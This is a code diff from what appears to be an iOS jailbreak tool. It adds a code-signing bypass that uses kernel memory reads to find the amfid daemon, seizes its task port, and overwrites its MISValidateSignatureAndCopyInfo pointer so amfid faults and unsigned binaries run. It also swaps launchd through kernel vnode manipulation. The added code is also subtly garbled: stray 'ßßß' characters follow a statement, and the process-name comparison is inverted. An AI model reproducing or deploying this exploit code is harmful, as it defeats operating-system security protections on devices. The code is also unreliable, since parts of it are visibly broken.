@@ -12,10 +12,11 @@
 #import "pplrw.h"
 #import "IOSurface_Primitives.h"
 #import "libkfd/perf.h"
-
 #define SYSTEM_VERSION_LOWER_THAN(v)                ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
 #define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)     ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)
 #define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
+#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
+
 extern int spawnRoot(NSString* path, NSArray* args, NSString** stdOut, NSString** stdErr); // this gives me the heebeejeebees (or however the fuck you spell it)
 extern int userspaceReboot(void);
 
@@ -35,8 +36,30 @@ NSString* GenerateRandomString(int length, unsigned int seed)
     
     return randomString;
 }
+int getamfidpid(void) {
+    uint64_t proc = get_kernel_proc();
+    uint64_t off_p_name = 0;
+    if(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"16.4")) {
+        off_p_name = 0x579;
+    } else if(SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(@"16.3.1")) {
+        off_p_name = 0x381;
+    }
 
-char* TelescopeDir(void) 
+    while(true) {
+        uint64_t nameptr = proc + off_p_name;
+        char name[32];
+        kread_kfd(_kfd, nameptr, &name, 32);
+        if(strcmp(name,(char*)"amfid")) {
+            return kread32_kfd(proc + 0x60);
+        }
+        proc = kread64_kfd(proc + 0x8);
+        if(!proc) {
+            return -1;
+        }
+        }
+    return 0;
+}
+char* TelescopeDir(void)
 {
     const char* hash = GenerateRandomString(13, 13).UTF8String;
     static char result[MAXPATHLEN];
@@ -182,8 +205,20 @@ uint64_t SwitchSysBin(char* to, char* from, uint64_t* orig_to_vnode, uint64_t* o
     kwrite64_kfd(to_vnode_nc + off_namecache_nc_vp, from_vnode);
     return 0;
 }
-
-UInt64 load_telescope(void) 
+UInt64 getLoadAddr(mach_port_t port) {
+    mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_64;
+    mach_port_t object_name = MACH_PORT_NULL;
+    mach_vm_address_t first_addr = 0;
+    mach_vm_size_t first_size = 0x1000;
+    vm_region_basic_info_64_t region;
+    UInt64 regionSz = sizeof(region);
+    kern_return_t ret = mach_vm_region(port, &first_addr, &first_size, VM_REGION_BASIC_INFO_64, &region, &region_count, &object_name);
+    if(ret != KERN_SUCCESS) {
+        NSLog(@"Couldn't get region: %s",mach_error_string(ret));
+    }
+    return first_addr;
+}
+UInt64 load_telescope(void)
 {
     NSString * err = NSString.new;
     NSString * out = NSString.new;
@@ -194,7 +229,6 @@ UInt64 load_telescope(void)
     NSString *injPath = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"insert_dylib"];
 
     NSString *patchpth = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"launchdhook.dylib"];
-    NSString *amfidpatchpth = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"amfidpatch.dylib"];
     NSString *ents = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"launchd.plist"];
 
     char* ts_dir = TelescopeDir();    
@@ -229,8 +263,6 @@ UInt64 load_telescope(void)
     spawnRoot(helper, @[@"xmldump", @"/usr/libexec/xpcproxy", [@(originalxpc) stringByAppendingPathExtension:@"plist"]], &out, &err);
 
     spawnRoot(helper, @[@"copy", patchpth, @(patch)], &out, &err);
-    spawnRoot(helper, @[@"copy", amfidpatchpth, @(amfidpatch)], &out, &err);
-
     // SignEnvironment();
 
     // patch launchd
@@ -245,16 +277,38 @@ UInt64 load_telescope(void)
     spawnRoot(ldidPath, @[[@"-S" stringByAppendingString:[@(originalxpc) stringByAppendingPathExtension:@"plist"]], @"-Cadhoc", @(originalxpc)], &out, &err);
     spawnRoot(sign, @[@(originalxpc)], &out, &err);
 
-    // patch amfid
-    spawnRoot(helper, @[@"pacstrip", @(originalamfid)], &out, &err);
-    spawnRoot(injPath, @[@"--all-yes", @"--inplace", @(amfidpatch), @(originalamfid)], &out, &err);
-    spawnRoot(ldidPath, @[[@"-S" stringByAppendingString:[@(originalamfid) stringByAppendingPathExtension:@"plist"]], @"-Cadhoc", @(originalamfid)], &out, &err);
-    spawnRoot(sign, @[@(originalamfid)], &out, &err);
-
+    int amfidpid = getamfidpid();
+    if(amfidpid == -1) {
+        NSLog(@"Failed to get amfid pid!");
+    }
+    mach_port_t amfidport = 0;
+    kern_return_t ret = task_for_pid(mach_task_self(), amfidpid, &amfidport);
+    if(ret != 0) {
+        NSLog(@"Couldn't get amfid task: %s",mach_error_string(ret));
+        return 0;
+    }
+    UInt64 loadAddress = getLoadAddr(amfidport);
+    mach_port_t exceptionPort = 0;
+    void *amfid_header = malloc(0x8000);
+    assert(amfid_header != NULL);
+    mach_vm_size_t outsizedispose = 0;
+    void *libmis = dlopen("libmis.dylib", RTLD_LAZY);
+    void *MISVALidblalal = dlsym(libmis,"MISValidateSignatureAndCopyInfo");
+    vm_read_overwrite(amfidport, loadAddress, 0x8000, amfid_header, &outsizedispose);
+    void* found = memmem(amfid_header,0x8000,&MISVALidblalal,sizeof(MISVALidblalal));
+    size_t offset_MISIAblalbdl = found - amfid_header;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exceptionPort);
+    mach_port_insert_right(mach_task_self(), exceptionPort, exceptionPort, MACH_MSG_TYPE_MAKE_SEND);
+    task_set_exception_ports(amfidport, EXC_MASK_BAD_ACCESS, exceptionPort, EXCEPTION_DEFAULT,6);
+    vm_address_t page = (loadAddress + offset_MISIAblalbdl) & ~vm_page_mask;
+    vm_protect(amfidport, page, vm_page_size, 0, VM_PROT_READ | VM_PROT_WRITE);
+    UInt64 data = ptrauth_sign_unauthenticated((void*)0x12345, ptrauth_key_asia, (loadAddress + offset_MISIAblalbdl));
+    vm_write(amfidport,(loadAddress + offset_MISIAblalbdl),&data,sizeof(UInt64)); //Nobody likes you, amfid.
+    NSLog(@"Amfid should now crash as soon as it tries to authenticate a binary, we will redirect handle this exception to make it continue, and allow the unauthenticated binary.");ßßß
     uint64_t orig_nc_vp, orig_to_vnode = 0;
     SwitchSysBinOld(GetVnodeAtPathByChdir("/sbin"), "launchd", originallaunchd);
     //SwitchSysBin("/sbin/launchd", originallaunchd, &orig_to_vnode, &orig_nc_vp);
-
+    
     if (SYSTEM_VERSION_LOWER_THAN(@"16.4")) 
     {
         uint64_t orig_nc_vp, orig_to_vnode = 0;
